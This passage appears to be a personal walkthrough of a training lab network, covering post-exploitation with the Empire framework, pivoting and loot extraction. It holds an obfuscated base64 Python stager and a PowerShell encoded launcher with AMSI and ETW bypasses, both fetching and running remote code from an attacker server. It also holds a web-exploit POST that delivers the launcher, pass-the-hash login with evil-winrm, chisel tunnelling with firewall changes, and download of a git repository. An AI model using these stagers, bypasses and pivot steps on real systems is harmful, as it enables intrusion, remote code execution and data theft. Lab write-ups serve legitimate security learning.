echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5czsKaW1wb3J0IHJlLCBzdWJwcm9jZXNzOwpjbWQgPSAicHMgLWVmIHwgZ3JlcCBMaXR0bGVcIFNuaXRjaCB8IGdyZXAgLXYgZ3JlcCIKcHMgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkKb3V0LCBlcnIgPSBwcy5jb21tdW5pY2F0ZSgpOwppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKTsKCmltcG9ydCB1cmxsaWIucmVxdWVzdDsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMC41MC44NS4xMTM6ODAwMCc7dD0nL2FkbWluL2dldC5waHAnOwpyZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdChzZXJ2ZXIrdCk7CnByb3h5ID0gdXJsbGliLnJlcXVlc3QuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIucmVxdWVzdC5idWlsZF9vcGVuZXIocHJveHkpOwpvLmFkZGhlYWRlcnM9WygnVXNlci1BZ2VudCcsVUEpLCAoIkNvb2tpZSIsICJzZXNzaW9uPW41Z1pFcXNQQ2VNWGg5WVBCQmpnQ3FKeXJMMD0iKV07CnVybGxpYi5yZXF1ZXN0Lmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCk7CklWPWFbMDo0XTsKZGF0YT1hWzQ6XTsKa2V5PUlWKydbRyw4JkNIXTw0dW18WVcvPk1qO2VYTERwd2RJOmxmVicuZW5jb2RlKCdVVEYtOCcpOwpTLGosb3V0PWxpc3QocmFuZ2UoMjU2KSksMCxbXTsKZm9yIGkgaW4gbGlzdChyYW5nZSgyNTYpKToKICAgIGo9KGorU1tpXStrZXlbaSVsZW4oa2V5KV0pJTI1NjsKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV07Cmk9aj0wOwpmb3IgY2hhciBpbiBkYXRhOgogICAgaT0oaSsxKSUyNTY7CiAgICBqPShqK1NbaV0pJTI1NjsKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV07CiAgICBvdXQuYXBwZW5kKGNocihjaGFyXlNbKFNbaV0rU1tqXSklMjU2XSkpOwpleGVjKCcnLmpvaW4ob3V0KSk7'));" | python3 &
rm -f "$0"
exit

[+] Stager copied to clipboard.
```
6. We cannot access the gitServer from here so we need to make a connection routing from `.200` to `.150`.
7. Start a new listener `http-hop`, set `host` as `200` and `RedirectListener` as `CLIHTTP`, and Port as `47000`
```console
(Empire) > uselistener http_hop

 Author       @harmj0y                                                              
 Description  Starts a http[s] listener (PowerShell or Python) that uses a GET/POST 
              approach.                                                             
 Name         HTTP[S] Hop                                                           


┌Record Options──────┬────────────────────────────────┬──────────┬────────────────────────────────────┐
│ Name               │ Value                          │ Required │ Description                        │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ DefaultProfile     │                                │ False    │ Default communication profile for  │
│                    │                                │          │ the agent, extracted from          │
│                    │                                │          │ RedirectListener automatically.    │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ Host               │                                │ True     │ Hostname/IP for staging.           │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ Launcher           │ powershell -noP -sta -w 1 -enc │ True     │ Launcher string.                   │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ Name               │ http_hop                       │ True     │ Name for the listener.             │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ OutFolder          │ /tmp/http_hop/                 │ True     │ Folder to output redirectors to.   │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ Port               │                                │ True     │ Port for the listener.             │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ RedirectListener   │                                │ True     │ Existing listener to redirect the  │
│                    │                                │          │ hop traffic to.                    │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ RedirectStagingKey │                                │ False    │ The staging key for the redirect   │
│                    │                                │          │ listener, extracted from           │
│                    │                                │          │ RedirectListener automatically.    │
├────────────────────┼────────────────────────────────┼──────────┼────────────────────────────────────┤
│ SlackURL           │                                │ False    │ Your Slack Incoming Webhook URL to │
│                    │                                │          │ communicate with your Slack        │
│                    │                                │          │ instance.                          │
└────────────────────┴────────────────────────────────┴──────────┴────────────────────────────────────┘

(Empire: uselistener/http_hop) > set Host 10.200.84.200
[*] Set Host to 10.200.84.200
(Empire: uselistener/http_hop) > set Port 47000
[*] Set Port to 47000
(Empire: uselistener/http_hop) > set RedirectListener CLIHTTP
[*] Set RedirectListener to CLIHTTP
(Empire: uselistener/http_hop) > execute
[+] Listener http_hop successfully started
```
8. Then we will setup stager.
```console
(Empire) > usestager multi/launcher

 Author       @harmj0y                                          
 Description  Generates a one-liner stage0 launcher for Empire. 
 Name         multi/launcher                                    


┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value              │ Required │ Description                         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Base64           │ True               │ True     │ Switch. Base64 encode the output.   │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
│                  │                    │          │ to be prepended to the launcher     │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Language         │ powershell         │ True     │ Language of the stager to generate. │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Listener         │                    │ True     │ Listener to generate stager for.    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      │
│                  │                    │          │ powershell code, uses the           │
│                  │                    │          │ ObfuscateCommand for obfuscation    │
│                  │                    │          │ types. For powershell only.         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ObfuscateCommand │ Token\All\1        │ False    │ The Invoke-Obfuscation command to   │
│                  │                    │          │ use. Only used if Obfuscate switch  │
│                  │                    │          │ is True. For powershell only.       │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ OutFile          │                    │ False    │ Filename that should be used for    │
│                  │                    │          │ the generated output.               │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default            │ False    │ Proxy to use for request (default,  │
│                  │                    │          │ none, or other).                    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default            │ False    │ Proxy credentials                   │
│                  │                    │          │ ([domain\]username:password) to use │
│                  │                    │          │ for request (default, none, or      │
│                  │                    │          │ other).                             │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ SafeChecks       │ True               │ True     │ Switch. Checks for LittleSnitch or  │
│                  │                    │          │ a SandBox, exit the staging process │
│                  │                    │          │ if true. Defaults to True.          │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ StagerRetries    │ 0                  │ False    │ Times for the stager to retry       │
│                  │                    │          │ connecting.                         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent        │ default            │ False    │ User-agent string to use for the    │
│                  │                    │          │ staging request (default, none, or  │
│                  │                    │          │ other).                             │
└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘

(Empire: usestager/multi/launcher) > set Listener http_hop
[*] Set Listener to http_hop
(Empire: usestager/multi/launcher) > execute
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAcgBvAHgAeQA9AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARABlAGYAYQB1AGwAdABXAGUAYgBQAHIAbwB4AHkAOwAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBbAEcALAA4ACYAQwBIAF0APAA0AHUAbQB8AFkAVwAvAD4ATQBqADsAZQBYAEwARABwAHcAZABJADoAbABmAFYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBJAFYALwBFAEMAQwBIAHgAUQBiAFMARgB3AFcAVgA5AHEAUgBaADMAQQBOAHAAKwBKAGsASQA9ACIAKQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAEEAQQBMAGcAQQB5AEEARABBAEEATQBBAEEAdQBBAEQAZwBBAE4AQQBBAHUAQQBEAEkAQQBNAEEAQQB3AEEARABvAEEATgBBAEEAMwBBAEQAQQBBAE0AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJABoAG8AcAA9ACcAaAB0AHQAcABfAGgAbwBwACcAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
[+] Stager copied to clipboard.
```
9. After setting up stager, this will create http_hop directory in tmp which we will move to the compromised.
```console
# Attacking machine
❯ cd /tmp && zip -r http_htop.zip http_hop
  adding: http_hop/ (stored 0%)
  adding: http_hop/login/ (stored 0%)
  adding: http_hop/login/process.php (deflated 67%)
  adding: http_hop/news.php (deflated 67%)
  adding: http_hop/admin/ (stored 0%)
  adding: http_hop/admin/get.php (deflated 67%)
❯ sudo python3 -m http.server 80 &
[2] 26308

# Compromised machine ".200"
[root@prod-serv hop-divu050704]# unzip http_hop.zip
Archive:  http_hop.zip
   creating: http_hop/
   creating: http_hop/login/
  inflating: http_hop/login/process.php  
  inflating: http_hop/news.php       
   creating: http_hop/admin/
  inflating: http_hop/admin/get.php  
[root@prod-serv hop-divu050704]# ls
```
10. Open port in firewall of the compromised machine `.200`
```console
[root@prod-serv hop-divu050704]# firewall-cmd --zone=public --add-port 47000/tcp
success
```

11. Host the set of files in hop via php
```console
[root@prod-serv hop-divu050704]# php -S 0.0.0.0:47000 &
[3] 2372
[root@prod-serv hop-divu050704]# PHP 7.2.24 Development Server started at Wed Aug 31 04:56:33 2022
Listening on http://0.0.0.0:47000
Document root is /tmp/hop-divu050704
Press Ctrl-C to quit.
```
12. Then with burpSuite send the command recieved above to the earlier places web_exploit.
```php
POST /web/exploit-divu050704.php HTTP/1.1
Host: 10.200.84.150
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1 
Content-Type: application/x-www-form-urlencoded a=powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAcgBvAHgAeQA9AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARABlAGYAYQB1AGwAdABXAGUAYgBQAHIAbwB4AHkAOwAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBbAEcALAA4ACYAQwBIAF0APAA0AHUAbQB8AFkAVwAvAD4ATQBqADsAZQBYAEwARABwAHcAZABJADoAbABmAFYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBGAGgAVQBCAGMAbgB5AFcANABIAGgAVgBpAGMAOQBYAG8AQwBPAHIAZwBxAEgAdAA2AHAATQA9ACIAKQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAEEAQQBMAGcAQQB5AEEARABBAEEATQBBAEEAdQBBAEQAZwBBAE4AQQBBAHUAQQBEAEkAQQBNAEEAQQB3AEEARABvAEEATgBBAEEAMwBBAEQAQQBBAE0AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABoAG8AcAA9ACcAaAB0AHQAcABfAGgAbwBwACcAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
```
13. Recieved agent from the listner and interact
```console
(Empire: agents) > agents

┌Agents──────────┬────────────┬───────────────┬──────────────────┬────────────┬──────┬───────┬─────────────────────────┬──────────┐
│ ID │ Name      │ Language   │ Internal IP   │ Username         │ Process    │ PID  │ Delay │ Last Seen               │ Listener │
├────┼───────────┼────────────┼───────────────┼──────────────────┼────────────┼──────┼───────┼─────────────────────────┼──────────┤
│ 11 │ VHQMSDMU* │ python     │ 10.200.84.200 │ root             │ python3    │ 3101 │ 5/0.0 │ 2022-08-31 10:37:57 IST │ CLIHTTP  │
│    │           │            │               │                  │            │      │       │ (now)                   │          │
├────┼───────────┼────────────┼───────────────┼──────────────────┼────────────┼──────┼───────┼─────────────────────────┼──────────┤
│ 12 │ ASW4N6FT* │ powershell │ 10.200.84.150 │ WORKGROUP\SYSTEM │ powershell │ 2964 │ 5/0.0 │ 2022-08-31 10:37:53 IST │ CLIHTTP  │
│    │           │            │               │                  │            │      │       │ (4 seconds ago)         │          │
└────┴───────────┴────────────┴───────────────┴──────────────────┴────────────┴──────┴───────┴─────────────────────────┴──────────┘

(Empire: agents) > interact ASW4N6FT
(Empire: ASW4N6FT) > shell
[*] Exit Shell Menu with Ctrl+C
(ASW4N6FT) C:\GitStack\gitphp > whoami
NT AUTHORITY\SYSTEM
```
### Personal PC
1. Connect with `evil-winrm` with scripts loaded :gun: 
```console
❯ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemen

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completio

Info: Establishing connection to remote endpoint
```
2. Then Import Invoke-Portscan.ps1 and use it.
```console
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan.ps1 
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.84.150 -TopPorts 50


Hostname      : 10.200.84.150
alive         : True
openPorts     : {80, 3389, 445, 139...}
closedPorts   : {443, 21, 23, 110...}
filteredPorts : {}
finishTime    : 8/31/2022 7:36:57 AM

```
3. Pivoted network with chisel
```console
# Compromised machine
*Evil-WinRM* PS C:\Users\Administrator> netsh advfirewall firewall add rule name="Chisel-divu050704" dir=in action=allow protocol=tcp localport=15997
Ok.
*Evil-WinRM* PS C:\Users\Administrator> ./chisel-divu050704.exe server -p 15997 --socks5
chisel-divu050704.exe : 2022/09/02 13:44:14 server: Fingerprint IgXizVmVfO9eiluavopEzy0n1YBvAP7IKL3M21nL9Vg=
    + CategoryInfo          : NotSpecified: (2022/09/02 13:4...P7IKL3M21nL9Vg=:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2022/09/02 13:44:14 server: Listening on http://0.0.0.0:15997
```
4. After  connecting open firefox with foxyproxy
```
IP- 127.0.0.1
PORT - 5005
```
5. Go to the ip `10.200.84.100` and start vappalyzer and found that the website was running `php 7.4.11`
6. Now on Winrm find the GitServer directory and download it to the local machine
```console
*Evil-WinRM* PS C:\GitStack\repositories> download C:\Gitstack\Repositories\Website.git Website.git
Info: Downloading C:\Gitstack\Repositories\Website.git to ./C:\Gitstack\Repositories\Website.git Website.git

```
7. Clone GitTools repository 
```console
❯ git clone https://github.com/internetwache/GitTools
Cloning into 'GitTools'...
remote: Enumerating objects: 242, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 242 (delta 9), reused 27 (delta 7), pack-reused 209
Receiving objects: 100% (242/242), 56.46 KiB | 342.00 KiB/s, done.
Resolving deltas: 100% (88/88), done.
```
8. Rename the folder to .git inside Website.git
9. Move GitTools to `Website.git`
10. Extract the repository from `.git` file retrieved
```console
❯ GitTools/Extractor/extractor.sh . Website
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: 70dde80cc19ec76704567996738894828f4ee895
[+] Found folder: /home/divu050704/Website.git/Website/0-70dde80cc19ec76704567996738894828f4ee895/css
[+] Found file: /home/divu050704/Website.git/Website/0-70dde80cc19ec76704567996738894828f4ee895/css/.DS_Store
[+] Found file: /home/divu050704/Website.git/Website/0-70dde80cc19ec76704567996738894828f4ee895/css/bootstrap.min.css
<--clip-->
[+] Found file: /home/divu050704/Website.git/Website/2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/fonts/Andika_New_Basic.zip
[+] Found file: /home/divu050704/Website.git/Website/2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/fonts/OFL.txt
[+] Found folder: /home/divu050704/Website.git/Website/2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/imgs
[+] Found file: /home/divu050704/Website.git/Website/2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/assets/imgs/ruby.jpg
[+] Found file: /home/divu050704/Website.git/Website/2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2/resources/index.php

❯ ls
GitTools  Website

❯ cd Website

❯ ls
0-70dde80cc19ec76704567996738894828f4ee895
1-345ac8b236064b431fa43f53d91c98c4834ef8f3
2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
```
11. Read all the commits with script
```console
❯ separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"


=======================================
0-70dde80cc19ec76704567996738894828f4ee895
tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
author twreath <me@thomaswreath.thm> 1604849458 +0000
committer twreath <me@thomaswreath.thm> 1604849458 +0000

Static Website Commit


=======================================
1-345ac8b236064b431fa43f53d91c98c4834ef8f3
tree c4726fef596741220267e2b1e014024b93fced78
parent 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
author twreath <me@thomaswreath.thm> 1609614315 +0000
